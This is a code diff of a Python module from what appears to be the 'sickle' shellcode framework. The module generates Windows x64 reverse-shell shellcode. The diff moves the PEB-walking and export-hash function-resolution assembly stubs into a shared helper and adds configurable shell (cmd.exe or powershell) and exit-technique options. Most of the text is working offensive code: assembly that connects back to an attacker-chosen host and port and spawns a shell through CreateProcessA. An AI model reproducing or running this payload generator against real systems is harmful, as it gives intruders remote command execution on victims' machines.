@@ -5,14 +5,12 @@ import struct
 from sickle.common.lib.generic import convert
 from sickle.common.lib.generic import modparser
 from sickle.common.lib.programmer import builder
+from sickle.common.lib.programmer import stubhub
 
 from sickle.common.lib.reversing.assembler import Assembler
 
 from sickle.common.headers.windows import (
-    winnt,
-    ntdef,
     ws2def,
-    winternl,
     winsock2,
     processthreadsapi
 )
@@ -55,6 +53,19 @@ class Shellcode():
     arguments["LPORT"]["optional"] = "yes"
     arguments["LPORT"]["description"] = "Listening port on listener host"
 
+    arguments["SHELL"] = {}
+    arguments["SHELL"]["optional"] = "yes"
+    arguments["SHELL"]["description"] = "Shell environment (powershell.exe, cmd.exe, etc)"
+
+    advanced = {}
+    advanced["EXITFUNC"] = {}
+    advanced["EXITFUNC"]["optional"] = "yes"
+    advanced["EXITFUNC"]["description"] = "Exit technique"
+    advanced["EXITFUNC"]["options"] = { "terminate": "Terminates the process and all of its threads",
+                                        "func": "Have the shellcode operate as function",
+                                        "thread": "Exit as a thread",
+                                        "process": "Exit as a process" }
+
     def __init__(self, arg_object):
 
         self.arg_list = arg_object["positional arguments"]
@@ -63,7 +74,6 @@ class Shellcode():
             "Kernel32.dll": [
                 "LoadLibraryA",
                 "CreateProcessA",
-                "TerminateProcess",
             ],
             "Ws2_32.dll": [
                 "WSAStartup",
@@ -72,197 +82,80 @@ class Shellcode():
             ],
         }
 
+        self.set_args()
+
         sc_args = builder.init_sc_args(self.dependencies)
         sc_args.update({
             "wsaData"              : 0x00,
             "name"                 : 0x00,
             "lpStartInfo"          : ctypes.sizeof(processthreadsapi._STARTUPINFOA),
-            "lpCommandLine"        : len("cmd\x00\x00\x00\x00\x00"),
+            "lpCommandLine"        : self.shell_env_len,
             "lpProcessInformation" : 0x00,
-       })
+        })
 
         self.stack_space = builder.calc_stack_space(sc_args)
         self.storage_offsets = builder.gen_offsets(sc_args)
 
         return
 
-    def get_kernel32(self):
-        """Generates stub for obtaining the base address of Kernel32.dll
+    def set_args(self):
+        """Configure the arguments that may be used by the shellcode stub
         """
 
-        stub = f"""
-getKernel32:
-    push rbp
-    mov rbp, rsp
-    mov dl, 0x4b
-getPEB:
-    mov rcx, 0x60
-    mov r8, gs:[rcx]
-getHeadEntry:
-    mov rdi, [r8 + {winternl._PEB.Ldr.offset}]
-    mov rdi, [rdi + {winternl._PEB_LDR_DATA.InLoadOrderModuleList.offset}]
-search:
-    xor rcx, rcx
-    mov rax, [rdi + {winternl._LDR_DATA_TABLE_ENTRY.DllBase.offset}]
-    mov rsi, [rdi + {winternl._LDR_DATA_TABLE_ENTRY.BaseDllName.offset + ntdef._UNICODE_STRING.Buffer.offset}]
-    mov rdi, [rdi]
-    cmp [rsi + 0x18], cx
-    jne search
-    cmp [rsi], dl
-    jne search
-found:
-    leave
-    ret
-        """
-
-        return stub
-
-    def lookup_function(self):
-        """Generates the stub responsible for obtaining the base address of a function
-        """
-
-        stub = f"""
-lookupFunction:
-    push rbp
-    mov rbp, rsp
-    mov ebx, [rdi + {winnt._IMAGE_DOS_HEADER.e_lfanew.offset}]
-    add rbx, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset + winnt._IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
-    add rbx, rdi
-    mov eax, [rbx]
-    mov rbx, rdi
-    add rbx, rax
-    mov eax, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
-    mov r8, rdi
-    add r8, rax
-    mov rcx, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
-parseNames:
-    jecxz error
-    dec ecx
-    mov eax, [r8 + rcx * 4]
-    mov rsi, rdi
-    add rsi, rax
-    xor r9, r9
-    xor rax, rax
-    cld
-calcHash:
-    lodsb
-    test al, al
-    jz calcDone
-    ror r9d, 0xD
-    add r9, rax
-    jmp calcHash
-calcDone:
-    cmp r9d, edx
-    jnz parseNames
-findAddress:
-    mov r8d, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
-    add r8, rdi
-    xor rax, rax
-    mov ax, [r8 + rcx * 2]
-    mov r8d, [rbx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
-    add r8, rdi
-    mov eax, [r8 + rax * 4]
-    add rax, rdi
-error:
-    leave
-    ret
-        """
-
-        return stub
-
-    def load_library(self, lib):
-        """Generates the stub to load a library not currently loaded into a process
-        """
-
-        lists = convert.from_str_to_xwords(lib)
-        write_index = self.storage_offsets['functionName']
-
-        src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))
-
-        for i in range(len(lists["QWORD_LIST"])):
-            src += "    mov rcx, 0x{}\n".format( struct.pack('<Q', lists["QWORD_LIST"][i]).hex() )
-            src += "    mov [rbp-{}], rcx\n".format(hex(write_index))
-            write_index -= 8
-
-        for i in range(len(lists["DWORD_LIST"])):
-            src += "    mov ecx, dword 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() )
-            src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
-            write_index -= 4
-
-        for i in range(len(lists["WORD_LIST"])):
-            src += "    mov cx, 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
-            src += "    mov [rbp-{}], cx\n".format(hex(write_index))
-            write_index -= 2
-
-        for i in range(len(lists["BYTE_LIST"])):
-            src += "    mov cl, {}\n".format( hex(lists["BYTE_LIST"][i]) )
-            src += "    mov [rbp-{}], cl\n".format(hex(write_index))
-            write_index -= 1
-
-        src += f"""
-    xor rcx, rcx
-    mov [rbp-{write_index}], cl
-    lea rcx, [rbp - {self.storage_offsets['functionName']}]
-    mov rax, [rbp - {self.storage_offsets['LoadLibraryA']}]
-    call rax
-        """
-
-        return src
-
-    def resolve_functions(self):
-        """This function is responsible for loading all libraries and resolving respective functions
-        """
-
-        stub = ""
-        for lib, imports in self.dependencies.items():
-            if (lib != "Kernel32.dll"):
-                stub += self.load_library(lib)
-                stub += """
-    mov rdi, rax
-                """
-
-            for func in range(len(imports)):
-                stub += f"""
-get_{imports[func]}:
-    mov rdx, {convert.from_str_to_win_hash(imports[func])}
-    call lookupFunction
-    mov [rbp - {self.storage_offsets[imports[func]]}], rax
-                """
-
-        return stub
-
-    def generate_source(self):
-        """Returns bytecode generated by the keystone engine.
-        """
-
-        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
+        all_args = Shellcode.arguments
+        all_args.update(Shellcode.advanced)
+        argv_dict = (modparser.argument_check(all_args, self.arg_list))
         if (argv_dict == None):
             exit(-1)
 
-        if ("LPORT" not in argv_dict.keys()):
-            lport = 4444
+        # Set the shell environment that will be used by the shellcode. We must
+        # ensure to NULL terminate it.
+        if "SHELL" not in argv_dict.keys():
+            self.shell = "cmd.exe"
         else:
-            lport = int(argv_dict["LPORT"])
+            self.shell = argv_dict["SHELL"]
 
+        self.shell += "\x00"
+        while (len(self.shell) % 8) != 0:
+            self.shell += "\x00"
 
-        sin_addr = hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))
-        sin_port = struct.pack('<H', lport).hex()
+        # Document the size of the shell environment
+        self.shell_env_len = len(self.shell)
+
+        # Configure the options used by the host to obtain the callback
+        if "LPORT" not in argv_dict.keys():
+            self.lport = 4242
+        else:
+            self.lport = int(argv_dict["LPORT"])
+
+        self.lhost = argv_dict['LHOST']
+
+        # Set the EXITFUNC and update the necessary dependencies
+        self.exit_func = ""
+        if "EXITFUNC" not in argv_dict.keys():
+            self.exit_func = "terminate"
+        else:
+            self.exit_func = argv_dict["EXITFUNC"] 
+
+        if self.exit_func == "terminate":
+            self.dependencies["Kernel32.dll"] += "TerminateProcess",
+        elif self.exit_func == "thread":
+            self.dependencies["ntdll.dll"] = "RtlExitUserThread",
+        elif self.exit_func == "process":
+            self.dependencies["Kernel32.dll"] += "ExitProcess",
+
+        return 0
+
+    def gen_main(self):
+        """Returns assembly source code for the main functionality of the stub
+        """
+
+        # Setup the members of the sockaddr structure 
+        sin_port = struct.pack('<H', self.lport).hex()
         sin_family = struct.pack('>H', ws2def.AF_INET).hex()
+        sin_addr = hex(convert.ip_str_to_inet_addr(self.lhost))
 
-        shellcode = f"""
-_start:
-    push rbp
-    mov rbp, rsp
-    sub rsp, {self.stack_space}
-    and rsp, 0xfffffffffffffff0
-
-    call getKernel32
-    mov rdi, rax
-"""
-
-        shellcode += self.resolve_functions()
-
-        shellcode += f"""
+        src = f"""
 ; RAX => WSAStartup([in]  WORD      wVersionRequired, // RCX => MAKEWORD(2, 2) 
 ;                   [out] LPWSADATA lpWSAData);       // RDX => &wsaData
 call_WSAStartup:
@@ -331,14 +224,36 @@ init_STARTUPINFOA:
 ;                       [in, optional]      LPCSTR                lpCurrentDirectory,    // RSP+0x38 => NULL
 ;                       [in]                LPSTARTUPINFOA        lpStartupInfo,         // RSP+0x40 => &lpStartupInfo
 ;                       [out]               LPPROCESS_INFORMATION lpProcessInformation); // RSP+0x48 => &lpStartupInfo
-call_CreateProccessA:
-    xor ecx, ecx
-    mov rdx, rbp
-    lea rdx, [rbp - {self.storage_offsets['lpCommandLine']}]
-    xor rax, rax
-    mov eax, 0x646d63
-    mov [rdx], rax
-    xor r8, r8
+call_CreateProccessA:\n"""
+
+        cmd_buffer = convert.from_str_to_xwords(self.shell)
+        write_index = self.storage_offsets['lpCommandLine']
+
+        for i in range(len(cmd_buffer["QWORD_LIST"])):
+            src += "    mov rcx, 0x{}\n".format( struct.pack('<Q', cmd_buffer["QWORD_LIST"][i]).hex() )
+            src += "    mov [rbp-{}], rcx\n".format(hex(write_index))
+            write_index -= 8
+
+        for i in range(len(cmd_buffer["DWORD_LIST"])):
+            src += "    mov ecx, 0x{}\n".format( struct.pack('<L', cmd_buffer["DWORD_LIST"][i]).hex() )
+            src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
+            write_index -= 4
+
+        for i in range(len(cmd_buffer["WORD_LIST"])):
+            src += "    mov cx, 0x{}\n".format( struct.pack('<H', cmd_buffer["WORD_LIST"][i]).hex() )
+            src += "    mov [rbp-{}], cx\n".format(hex(write_index))
+            write_index -= 2
+
+        for i in range(len(cmd_buffer["BYTE_LIST"])):
+            src += "    mov cl, {}\n".format( hex(cmd_buffer["BYTE_LIST"][i]) )
+            src += "    mov [rbp-{}], cl\n".format(hex(write_index))
+            write_index -= 1
+
+        src += f"""    xor rcx, rcx
+    mov [rbp - {write_index}], cl
+    lea rdx, [rbp - {self.storage_offsets['lpCommandLine']}]\n"""
+
+        src += f"""    xor r8, r8
     xor r9, r9
     xor eax, eax
     inc eax
@@ -351,33 +266,22 @@ call_CreateProccessA:
     lea rbx, [rbp - {self.storage_offsets['lpProcessInformation']}]
     mov [rsp + 0x48], rbx
     mov rax, [rbp - {self.storage_offsets['CreateProcessA']}]
-    call rax
+    call rax\n"""
 
-; RAX => TerminateProcess([in] HANDLE hProcess,   // RCX => -1 (Current Process)
-;                         [in] UINT   uExitCode); // RDX => 0x00 (Clean Exit)
-call_TerminateProcess:
-	xor rcx, rcx
-	dec rcx
-	xor rdx, rdx
-	mov rax, [rbp - {self.storage_offsets['TerminateProcess']}]
-	call rax
-
-fin:
-    leave
-    ret
-"""
-
-        shellcode += self.get_kernel32()
-        shellcode += self.lookup_function()
-
-        return shellcode
+        return src
 
     def get_shellcode(self):
-        """Generates Windows (x64) generic reverse shell
+        """Generates Shellcode
         """
 
         generator = Assembler(Shellcode.arch)
+        win_stubs = stubhub.WinRawr(self.storage_offsets,
+                                    self.dependencies,
+                                    self.stack_space,
+                                    self.exit_func)
 
-        src = self.generate_source()
+        main_src = self.gen_main()
+        src = win_stubs.gen_source(main_src)
+        shellcode = generator.get_bytes_from_asm(src)
 
-        return generator.get_bytes_from_asm(src)
+        return shellcode
